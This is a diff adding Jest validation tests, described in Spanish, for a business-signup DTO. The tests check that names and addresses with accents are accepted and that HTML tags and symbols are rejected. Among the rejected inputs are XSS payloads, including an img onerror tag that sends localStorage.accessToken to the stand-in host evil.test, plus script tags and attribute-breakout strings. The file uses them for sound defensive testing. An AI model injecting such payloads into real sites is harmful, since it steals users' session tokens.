@@ -31,3 +31,50 @@ describe('SignupBusinessDto', () => {
     expect(await erroresDe(RegisterBusinessAdminDto, { fullName, email, password })).toEqual([]);
   });
 });
+
+describe('nombre del negocio', () => {
+  const conNombre = (businessName: string) => ({ ...base, phone: '+57 300 123 4567', businessName });
+
+  it.each(['Cancha El Golazo', 'Arena Pádel 2', 'Cañaveral Sport', 'Las Palmas 10'])(
+    'acepta letras, tildes, ñ, números y espacios: %s',
+    async (name) => {
+      expect(await erroresDe(SignupBusinessDto, conNombre(name))).toEqual([]);
+    },
+  );
+
+  it('limpia los espacios sobrantes en vez de rechazarlos', async () => {
+    const dto = plainToInstance(SignupBusinessDto, conNombre('  Cancha   El  Golazo '));
+    expect(dto.businessName).toBe('Cancha El Golazo');
+    expect((await validate(dto)).map((e) => e.property)).not.toContain('businessName');
+  });
+
+  it.each([
+    '<img src=x onerror=fetch("https://evil.test/s?j="+localStorage.accessToken)>',
+    '<script>alert(1)</script>',
+    'Cancha "El Golazo"',
+    'Golazo & Cia',
+    'Cancha_1',
+    '😀 Cancha',
+  ])('rechaza símbolos, etiquetas y espacios raros: %s', async (name) => {
+    expect(await erroresDe(SignupBusinessDto, conNombre(name))).toContain('businessName');
+  });
+});
+
+describe('texto libre sin etiquetas', () => {
+  const datos = (cambios: object) => ({ ...base, phone: '+57 300 123 4567', ...cambios });
+
+  it('acepta direcciones y barrios con # y guiones', async () => {
+    expect(
+      await erroresDe(SignupBusinessDto, datos({ address: 'Cra. 5 # 10-20, Local 3', neighborhood: "San José (Norte)" })),
+    ).toEqual([]);
+  });
+
+  it.each([
+    ['address', '<img src=x onerror=alert(1)>'],
+    ['neighborhood', 'Centro"><script>'],
+    ['fullName', '<b>Andrés</b>'],
+  ])('rechaza etiquetas en %s', async (campo, valor) => {
+    expect(await erroresDe(SignupBusinessDto, datos({ [campo]: valor }))).toContain(campo);
+  });
+});
+
